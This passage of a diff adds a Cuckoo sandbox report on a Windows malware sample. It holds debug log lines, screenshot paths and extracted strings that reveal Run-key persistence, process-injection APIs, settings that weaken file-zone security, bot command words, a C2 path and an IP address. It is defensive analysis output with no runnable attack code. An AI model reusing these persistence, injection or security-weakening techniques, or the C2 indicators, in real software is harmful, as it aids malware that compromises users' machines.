+            "2020-09-25 14:26:28,406 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:26:33,482 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:26:35,166 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0021.jpg'\n", 
+            "2020-09-25 14:26:35,251 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40410\n", 
+            "2020-09-25 14:26:36,364 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0022.jpg'\n", 
+            "2020-09-25 14:26:36,411 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40092\n", 
+            "2020-09-25 14:26:38,558 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:26:43,622 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:26:48,688 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:26:51,557 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0023.jpg'\n", 
+            "2020-09-25 14:26:51,670 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40410\n", 
+            "2020-09-25 14:26:52,796 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0024.jpg'\n", 
+            "2020-09-25 14:26:52,848 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40092\n", 
+            "2020-09-25 14:26:53,782 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:26:58,855 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:27:03,925 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:27:08,994 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:27:14,071 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:27:19,136 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:27:24,251 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:27:29,321 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:27:34,392 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:27:39,463 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:27:44,529 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:27:49,603 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:27:54,666 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:27:59,735 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:28:04,810 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:28:09,877 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:28:14,970 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:28:20,037 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:28:22,400 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0025.jpg'\n", 
+            "2020-09-25 14:28:22,438 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 39987\n", 
+            "2020-09-25 14:28:25,089 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:28:26,865 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'memory/2044-2.dmp'\n", 
+            "2020-09-25 14:28:30,158 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:28:35,232 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:28:40,298 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:28:45,382 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:28:50,451 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:28:55,526 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:28:56,527 [cuckoo.core.guest] INFO: cuckoo1: end of analysis reached!\n", 
+            "2020-09-25 14:28:56,626 [cuckoo.core.plugins] DEBUG: Stopped auxiliary module: Sniffer\n", 
+            "2020-09-25 14:28:56,627 [cuckoo.common.abstracts] DEBUG: Stopping machine win7\n", 
+            "2020-09-25 14:28:56,628 [cuckoo.common.abstracts] DEBUG: Getting status for win7\n", 
+            "2020-09-25 14:28:57,310 [cuckoo.common.abstracts] DEBUG: Getting status for win7\n", 
+            "2020-09-25 14:28:57,332 [cuckoo.core.resultserver] DEBUG: Stopped tracking machine 192.168.56.101 for task #3\n", 
+            "2020-09-25 14:28:57,333 [cuckoo.core.resultserver] DEBUG: Cancel <Context for FILE> for task 3\n", 
+            "2020-09-25 14:28:57,333 [cuckoo.core.resultserver] DEBUG: Cancel <Context for BSON> for task 3\n", 
+            "2020-09-25 14:28:57,333 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 829280\n", 
+            "2020-09-25 14:28:57,336 [cuckoo.core.resultserver] DEBUG: Cancel <Context for BSON> for task 3\n", 
+            "2020-09-25 14:28:57,337 [cuckoo.core.resultserver] DEBUG: Cancel <Context for FILE> for task 3\n", 
+            "2020-09-25 14:28:57,337 [cuckoo.core.resultserver] DEBUG: Cancel <Context for LOG> for task 3\n", 
+            "2020-09-25 14:28:57,340 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 19676420\n", 
+            "2020-09-25 14:28:57,350 [cuckoo.core.scheduler] DEBUG: Released database task #3\n", 
+            "2020-09-25 14:28:57,405 [cuckoo.core.plugins] DEBUG: Executed processing module \"AnalysisInfo\" for task #3\n", 
+            "2020-09-25 14:28:57,435 [cuckoo.core.plugins] DEBUG: Executed processing module \"BehaviorAnalysis\" for task #3\n", 
+            "2020-09-25 14:28:57,437 [cuckoo.core.plugins] DEBUG: Executed processing module \"Dropped\" for task #3\n", 
+            "2020-09-25 14:28:57,479 [cuckoo.core.plugins] DEBUG: Executed processing module \"DroppedBuffer\" for task #3\n", 
+            "2020-09-25 14:28:57,915 [cuckoo.core.plugins] DEBUG: Executed processing module \"MetaInfo\" for task #3\n", 
+            "2020-09-25 14:28:58,115 [cuckoo.core.plugins] DEBUG: Executed processing module \"ProcessMemory\" for task #3\n", 
+            "2020-09-25 14:28:58,115 [cuckoo.core.plugins] DEBUG: Executed processing module \"Procmon\" for task #3\n", 
+            "2020-09-25 14:28:58,351 [cuckoo.core.plugins] DEBUG: Executed processing module \"Screenshots\" for task #3\n", 
+            "2020-09-25 14:28:59,929 [cuckoo.core.plugins] DEBUG: Executed processing module \"Static\" for task #3\n", 
+            "2020-09-25 14:28:59,934 [cuckoo.core.plugins] DEBUG: Executed processing module \"Strings\" for task #3\n", 
+            "2020-09-25 14:28:59,937 [cuckoo.core.plugins] DEBUG: Executed processing module \"TargetInfo\" for task #3\n", 
+            "2020-09"
+        ]
+    }, 
+    "screenshots": [
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0001.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0002.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0003.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0004.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0005.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0006.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0007.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0008.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0009.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0010.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0011.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0012.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0013.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0014.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0015.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0016.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0017.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0018.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0019.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0020.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0021.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0022.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0023.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0024.jpg", 
+            "ocr": ""
+        }, 
+        {
+            "path": "/home/debian/.cuckoo/storage/analyses/1/shots/0025.jpg", 
+            "ocr": ""
+        }
+    ], 
+    "strings": [
+        "!This program cannot be run in DOS mode.", 
+        "Rich\u001f|4", 
+        ".idata", 
+        "@.reloc", 
+        "CorExitProcess", 
+        "MessageBoxW", 
+        "GetActiveWindow", 
+        "GetLastActivePopup", 
+        "GetUserObjectInformationW", 
+        "GetProcessWindowStation", 
+        "Sunday", 
+        "Monday", 
+        "Tuesday", 
+        "Wednesday", 
+        "Thursday", 
+        "Friday", 
+        "Saturday", 
+        "January", 
+        "February", 
+        "August", 
+        "September", 
+        "October", 
+        "November", 
+        "December", 
+        "MM/dd/yy", 
+        "dddd, MMMM dd, yyyy", 
+        "HH:mm:ss", 
+        "\u001f !\"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~", 
+        "\u001f !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~", 
+        "\u001f !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~", 
+        "1#SNAN", 
+        "1#QNAN", 
+        "Eph@jA", 
+        "jJh@eA", 
+        "jJh@eA", 
+        "EpPhX;A", 
+        "U,Rh0m@", 
+        "u^hd?A", 
+        "uThl?A", 
+        "uThx?A", 
+        "uhhX?A", 
+        "~pjCXf", 
+        "jA[jZZ+", 
+        "URPQQh@", 
+        "PP9E u", 
+        ";t$,v-", 
+        "UQPXY]Y[", 
+        "~';_t|%3", 
+        "PWWWWV", 
+        "PSSSSV", 
+        "+t\u001fHHt", 
+        "+t\"HHt", 
+        "HAO8\u001ft", 
+        ",SVWj0X", 
+        "Wj0XPV", 
+        "?456789:;<=", 
+        "\u001f !\"#$%&'()*+,-./0123", 
+        "Software\\Resilience Software", 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        ".DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        "svchost.exe", 
+        "iexplore.exe", 
+        "explorer.exe", 
+        "System", 
+        "smss.exe", 
+        "csrss.exe", 
+        "winlogon.exe", 
+        "lsass.exe", 
+        "spoolsv.exe", 
+        "alg.exe", 
+        "wuauclt.exe", 
+        "UpdateMutex:", 
+        "response=", 
+        "&view=", 
+        "&spec=", 
+        "&query=", 
+        "DetectShutdownClass", 
+        "download-", 
+        "update-", 
+        "checkin:", 
+        "scanin:", 
+        "uninstall", 
+        "SeDebugPrivilege", 
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 
+        "NtQueryInformationProcess", 
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 
+        "NTDLL.DLL", 
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 
+        "?456789:;<=", 
+        "\u001f !\"#$%&'()*+,-./0123", 
+        "Software\\Resilience Software", 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        ".DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        "svchost.exe", 
+        "iexplore.exe", 
+        "explorer.exe", 
+        "System", 
+        "smss.exe", 
+        "csrss.exe", 
+        "winlogon.exe", 
+        "lsass.exe", 
+        "spoolsv.exe", 
+        "alg.exe", 
+        "wuauclt.exe", 
+        "UpdateMutex:", 
+        "response=", 
+        "&view=", 
+        "&spec=", 
+        "&query=", 
+        "DetectShutdownClass", 
+        "download-", 
+        "update-", 
+        "checkin:", 
+        "scanin:", 
+        "uninstall", 
+        "?456789:;<=", 
+        "\u001f !\"#$%&'()*+,-./0123", 
+        "Software\\Resilience Software", 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        ".DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        "svchost.exe", 
+        "iexplore.exe", 
+        "explorer.exe", 
+        "System", 
+        "smss.exe", 
+        "csrss.exe", 
+        "winlogon.exe", 
+        "lsass.exe", 
+        "spoolsv.exe", 
+        "alg.exe", 
+        "wuauclt.exe", 
+        "UpdateMutex:", 
+        "response=", 
+        "&view=", 
+        "&spec=", 
+        "&query=", 
+        "DetectShutdownClass", 
+        "download-", 
+        "update-", 
+        "checkin:", 
+        "scanin:", 
+        "uninstall", 
+        "*********.com", 
+        "images/logo/header.php", 
+        "GetNativeSystemInfo", 
+        "kernel32.dll", 
+        "Windows 2000", 
+        "Windows XP", 
+        "Windows XP Professional x64", 
+        "Windows Server 2003", 
+        "Windows Home Server", 
+        "Windows Server 2003 R2", 
+        "Windows Vista", 
+        "Windows Server 2008", 
+        "Windows Server R2", 
+        "Windows 7", 
+        "64 Bit", 
+        "32 Bit", 
+        "Machines", 
+        "?456789:;<=", 
+        "\u001f !\"#$%&'()*+,-./0123", 
+        "Software\\Resilience Software", 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        ".DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        "svchost.exe", 
+        "iexplore.exe", 
+        "explorer.exe", 
+        "System", 
+        "smss.exe", 
+        "csrss.exe", 
+        "winlogon.exe", 
+        "lsass.exe", 
+        "spoolsv.exe", 
+        "alg.exe", 
+        "wuauclt.exe", 
+        "UpdateMutex:", 
+        "response=", 
+        "&view=", 
+        "&spec=", 
+        "&query=", 
+        "DetectShutdownClass", 
+        "download-", 
+        "update-", 
+        "checkin:", 
+        "scanin:", 
+        "uninstall", 
+        "*********.com", 
+        "images/logo/header.php", 
+        "Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)", 
+        "Content-Type:application/x-www-form-urlencoded", 
+        "http://%s%s", 
+        "?456789:;<=", 
+        "\u001f !\"#$%&'()*+,-./0123", 
+        "Software\\Resilience Software", 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        ".DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        "svchost.exe", 
+        "iexplore.exe", 
+        "explorer.exe", 
+        "System", 
+        "smss.exe", 
+        "csrss.exe", 
+        "winlogon.exe", 
+        "lsass.exe", 
+        "spoolsv.exe", 
+        "alg.exe", 
+        "wuauclt.exe", 
+        "UpdateMutex:", 
+        "response=", 
+        "&view=", 
+        "&spec=", 
+        "&query=", 
+        "DetectShutdownClass", 
+        "download-", 
+        "update-", 
+        "checkin:", 
+        "scanin:", 
+        "uninstall", 
+        ".exe;.bat;.reg;.vbs;", 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations", 
+        "LowRiskFileTypes", 
+        "Disabled", 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0", 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0", 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WinOldApp", 
+        "?456789:;<=", 
+        "\u001f !\"#$%&'()*+,-./0123", 
+        "Software\\Resilience Software", 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        ".DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        "svchost.exe", 
+        "iexplore.exe", 
+        "explorer.exe", 
+        "System", 
+        "smss.exe", 
+        "csrss.exe", 
+        "winlogon.exe", 
+        "lsass.exe", 
+        "spoolsv.exe", 
+        "alg.exe", 
+        "wuauclt.exe", 
+        "UpdateMutex:", 
+        "response=", 
+        "&view=", 
+        "&spec=", 
+        "&query=", 
+        "DetectShutdownClass", 
+        "download-", 
+        "update-", 
+        "checkin:", 
+        "scanin:", 
+        "uninstall", 
+        "?456789:;<=", 
+        "\u001f !\"#$%&'()*+,-./0123", 
+        "Software\\Resilience Software", 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        ".DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        "svchost.exe", 
+        "iexplore.exe", 
+        "explorer.exe", 
+        "System", 
+        "smss.exe", 
+        "csrss.exe", 
+        "winlogon.exe", 
+        "lsass.exe", 
+        "spoolsv.exe", 
+        "alg.exe", 
+        "wuauclt.exe", 
+        "UpdateMutex:", 
+        "response=", 
+        "&view=", 
+        "&spec=", 
+        "&query=", 
+        "DetectShutdownClass", 
+        "download-", 
+        "update-", 
+        "checkin:", 
+        "scanin:", 
+        "uninstall", 
+        "*********.com", 
+        "images/logo/header.php", 
+        "WSAStartup falied", 
+        "Socket failed", 
+        "35.161.124.173", 
+        "Connect failed", 
+        "Send falied", 
+        "Close falied", 
+        "eclipseddos", 
+        "IsWow64Process", 
+        "kernel32.dll", 
+        "user32.dll", 
+        "advapi32.dll", 
+        "shell32.dll", 
+        "urlmon.dll", 
+        "wininet.dll", 
+        "gdi32.dll", 
+        "rpcrt4.dll", 
+        "GetLastInputInfo", 
+        "user32.dll", 
+        "NoProcess", 
+        "?456789:;<=", 
+        "\u001f !\"#$%&'()*+,-./0123", 
+        "Software\\Resilience Software", 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        ".DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        "svchost.exe", 
+        "iexplore.exe", 
+        "explorer.exe", 
+        "System", 
+        "smss.exe", 
+        "csrss.exe", 
+        "winlogon.exe", 
+        "lsass.exe", 
+        "spoolsv.exe", 
+        "alg.exe", 
+        "wuauclt.exe", 
+        "UpdateMutex:", 
+        "response=", 
+        "&view=", 
+        "&spec=", 
+        "&query=", 
+        "DetectShutdownClass", 
+        "download-", 
+        "update-", 
+        "checkin:", 
+        "scanin:", 
+        "uninstall", 
+        "%s%s%d", 
+        "                          ", 
+        "abcdefghijklmnopqrstuvwxyz", 
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ", 
+        "                          ", 
+        "abcdefghijklmnopqrstuvwxyz", 
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ", 
+        "GetProcAddress", 
+        "GetCurrentProcess", 
+        "CloseHandle", 
+        "GetTickCount", 
+        "lstrcpyA", 
+        "LoadLibraryA", 
+        "HeapAlloc", 
+        "HeapFree", 
+        "EnterCriticalSection", 
+        "LeaveCriticalSection", 
+        "GetSystemInfo", 
+        "lstrcatA", 
+        "lstrlenA", 
+        "GetModuleHandleA", 
+        "GetComputerNameA", 
+        "GetVersionExA", 
+        "CreateToolhelp32Snapshot", 
+        "Process32First", 
+        "Process32Next", 
+        "VirtualAlloc", 
+        "SetEvent", 
+        "WaitForSingleObject", 
+        "GetLastError", 
+        "SetLastError", 
+        "lstrlenW", 
+        "CreateEventA", 
+        "CreateDirectoryW", 
+        "DeleteFileW", 
+        "CopyFileW", 
+        "MultiByteToWideChar", 
+        "VirtualAllocEx", 
+        "VirtualFreeEx", 
+        "ExitProcess", 
+        "CreateRemoteThread", 
+        "WriteProcessMemory", 
+        "DuplicateHandle", 
+        "CreateProcessW", 
+        "GetProcessVersion", 
+        "IsBadReadPtr", 
+        "VirtualFree", 
+        "VirtualQuery", 
+        "VirtualQueryEx", 
+        "GetProcessHeap", 
+        "OpenProcess", 
+        "GetCurrentProcessId", 
+        "TerminateProcess", 
+        "CreateThread", 
+        "GetCurrentThread", 
+        "SetThreadPriority", 
+        "ReadProcessMemory", 
+        "InitializeCriticalSection", 
+        "GetLocalTime", 
+        "MapViewOfFile", 
+        "lstrcmpA", 
+        "lstrcmpiA", 
+        "lstrcpyW", 
+        "lstrcatW", 
+        "CreateMutexA", 
+        "CreateFileMappingA", 
+        "GetModuleFileNameA", 
+        "GetModuleFileNameW", 
+        "GetCommandLineA", 
+        "WideCharToMultiByte", 
+        "TerminateThread", 
+        "SuspendThread", 
+        "ResumeThread", 
+        "WriteFile", 
+        "CreateFileW", 
+        "KERNEL32.dll", 
+        "GetMessageA", 
+        "TranslateMessage", 
+        "DispatchMessageA", 
+        "RegisterClassExA", 
+        "CreateWindowExA", 
+        "wsprintfA", 
+        "GetSystemMetrics", 
+        "wsprintfW", 
+        "DefWindowProcA", 
+        "MessageBoxA", 
+        "USER32.dll", 
+        "OpenProcessToken", 
+        "AdjustTokenPrivileges", 
+        "LookupPrivilegeValueA", 
+        "GetUserNameA", 
+        "RegCloseKey", 
+        "RegCreateKeyExA", 
+        "RegNotifyChangeKeyValue", 
+        "RegOpenKeyExA", 
+        "RegQueryValueExA", 
+        "RegSetValueExA", 
+        "RegSetValueExW", 
+        "RegDeleteKeyA", 
+        "ADVAPI32.dll", 
+        "SHGetFolderPathW", 
+        "SHELL32.dll", 
+        "CoCreateGuid", 
+        "ole32.dll", 
+        "StrStrA", 
+        "StrCmpNIA", 
+        "SHLWAPI.dll", 
+        "InternetOpenA", 
+        "InternetCloseHandle", 
+        "InternetConnectA", 
+        "InternetOpenUrlA", 
+        "InternetReadFile", 
+        "HttpOpenRequestA", 
+        "HttpSendRequestA", 
+        "InternetGetCookieA", 
+        "WININET.dll", 
+        "ObtainUserAgentString", 
+        "urlmon.dll", 
+        "WS2_32.dll", 
+        "UuidToStringA", 
+        "RPCRT4.dll", 
+        "EncodePointer", 
+        "DecodePointer", 
+        "GetModuleHandleExW", 
+        "IsDebuggerPresent", 
+        "IsProcessorFeaturePresent", 
+        "DeleteCriticalSection", 
+        "UnhandledExceptionFilter", 
+        "SetUnhandledExceptionFilter", 
+        "InitializeCriticalSectionAndSpinCount", 
+        "TlsGetValue", 
+        "TlsSetValue", 
+        "GetStdHandle", 
+        "LoadLibraryExW", 
+        "IsValidCodePage", 
+        "GetACP", 
+        "GetOEMCP", 
+        "GetCPInfo", 
+        "OutputDebugStringW", 
+        "GetCurrentThreadId", 
+        "LCMapStringW", 
+        "RtlUnwind", 
+        "GetStringTypeW", 
+        "FlushFileBuffers", 
+        "GetConsoleCP", 
+        "GetConsoleMode", 
+        "SetStdHandle", 
+        "SetFilePointerEx", 
+        "WriteConsoleW", 
+        "0$0(0,0l0t0|0", 
+        "<$<,<4<<<D<L<T<\\<d<l<t<|<", 
+        "=$=,=4=<=D=L=T=\\=d=l=t=|=", 
+        ">$>,>4><>D>L>T>\\>d>l>t>|>", 
+        "?$?,?4?<?D?L?T?\\?d?l?t?|?", 
+        "0$0,040<0D0L0T0\\0d0l0t0|0", 
+        "1$1,141<1D1L1T1\\1d1l1t1|1", 
+        "2$2,242<2D2L2T2\\2d2l2t2|2", 
+        "3 3(30383@3H3P3X3`3h3p3x3", 
+        "4 4(40484@4H4P4X4`4h4p4x4", 
+        "5 5(50585@5H5P5X5`5h5p5x5", 
+        "6 6(60686@6H6P6X6`6h6p6x6", 
+        "7 7(70787@7H7P7X7`7h7p7x7", 
+        "8 8(80888@8H8P8X8`8h8p8x8", 
+        "9 9(90989@9H9P9X9`9h9p9x9", 
+        "<(<><E<N<V<", 
+        "4\u001f5)5T5^5", 
+        "6/6:6@6I6Y6`6e6k6u6", 
+        "7%737=7K7U7b7l7y7~7", 
+        "8\u001f8$8*818G8Q8b8l8", 
+        "9&9B9L9\\9f9", 
+        ":!;-;4;Q;a;", 
+        "=2=9=O=", 
+        ">)>0>:>d>n>", 
+        "?%?0?7?H?o?", 
+        "0!0&0,0:0o0", 
+        "1O1V1]1e1o1", 
+        "1L2V2m2v2}2", 
+        "2*353E3c3t3", 
+        "374b4r4w4}4", 
+        "5>5I5N5T5`5i5s5}5", 
+        "6\u001f6-666@6J6Z6e6j6p6~6", 
+        "6&717X7c7x7", 
+        "8*8c8n8s8y8", 
+        "9*949>9N9Y9o9y9", 
+        ":#:6:?:H:N:q:", 
+        ";>;V;];", 
+        "=$=K=R=W=_=", 
+        ">\">0>9>J>T>p>", 
+        "?!?&?,?3?8?>?O?[?i?x?", 
+        "0\"0'0-02080=0C0H0N0i0o0w0", 
+        "1!1/141;1L1[1`1f1l1z1", 
+        "2\"262;2C2J2Z2d2i2p2w2", 
+        "3.343<3B3X3]3k3", 
+        "5?5m5}5", 
+        "6$6*6o6", 
+        "93;f<p<w<a>", 
+        "1\"3,3B3I3", 
+        "6(6>6E6", 
+        "7&7,7I7R7h7n7u7{7", 
+        "8#8,868;8A8F8L8g8l8v8", 
+        "8/<6<;<B<H<O<r<", 
+        "=#=q=v={=", 
+        ">\">)>1>8>@>G>L>W>f>p>u>{>", 
+        "?\"?(?/?~?", 
+        " 0*0=0", 
+        "1%1*10181g1t1z1", 
+        "2Z2d2j2p2z2", 
+        "3\u001f3%3T3a3f3s3", 
+        "3U4l4y4", 
+        "4\u001f5$50555T5", 
+        "7$8U8m8", 
+        "9#9,949L9d9r9y9", 
+        "9;:S:]:y:", 
+        ">8>Y>|>", 
+        "1Y1`1g1n1", 
+        "3%4:4H4Q4|4", 
+        "5,5F5N5Y5p5", 
+        ":\u001f:):6:@:O:W:", 
+        "=$=*=6=F=L=[=b=r=x=~=", 
+        ">#>f>~>", 
+        "?&?>?J?Y?~?", 
+        "0(0?0N0", 
+        "5%5,5054585<5@5D5H5", 
+        "60676<6@6D6e6", 
+        "6.74787<7@7", 
+        "1\u001f111@1G1X1f1q1", 
+        "3\"4b4i4|4", 
+        "5'50555;5E5O5_5o5", 
+        "7-7?7Q7c7u7", 
+        "8$868H8Z8", 
+        "<<<I<N<\\<", 
+        "9U:_:z:#;Y;", 
+        "0$0(0.02080<0B0F0W0", 
+        "5@6b7j7", 
+        "9>:F:R:a:", 
+        "4 4$4(4Q4w4", 
+        "51686<6@6D6H6L6P6T6", 
+        ":w=5>N>]>~>", 
+        "<(<H<d<h<", 
+        "=8=X=x=", 
+        "= =$=(=,=0=4=8=", 
+        "0P5T5X5\\5`5d5h5l5p5t5x5P8T8X8\\8`8d8h8l8p8t8x8", 
+        ": :$:(:,:0:4:8:<:@:D:H:L:P:T:X:\\:`:d: >$>(>,>0>4>8><>@>D>H>", 
+        "8 8$8(8,8084888<8@8D8H8L8P8T8X8\\8`8d8h8l8p8t8x8|8", 
+        "9 9$9(9,9094989<9@9D9H9L9P9T9X9\\9`9d9h9l9", 
+        "mscoree.dll", 
+        "@R6002", 
+        "- floating point support not loaded", 
+        "- not enough space for arguments", 
+        "- not enough space for environment", 
+        "- abort() has been called", 
+        "- not enough space for thread data", 
+        "- unexpected multithread lock error", 
+        "- unexpected heap error", 
+        "- unable to open console device", 
+        "- not enough space for _onexit/atexit table", 
+        "- pure virtual function call", 
+        "- not enough space for stdio initialization", 
+        "- not enough space for lowio initialization", 
+        "- unable to initialize heap", 
+        "- CRT not initialized", 
+        "- Attempt to initialize the CRT more than once.", 
+        "This indicates a bug in your application.", 
+        "- not enough space for locale information", 
+        "- Attempt to use MSIL code from this assembly during native code initialization", 
+        "This indicates a bug in your application. It is most likely the result of calling an MSIL-compiled (/clr) function from a native constructor or from DllMain.", 
+        "- inconsistent onexit begin-end variables", 
+        "DOMAIN error", 
+        "SING error", 
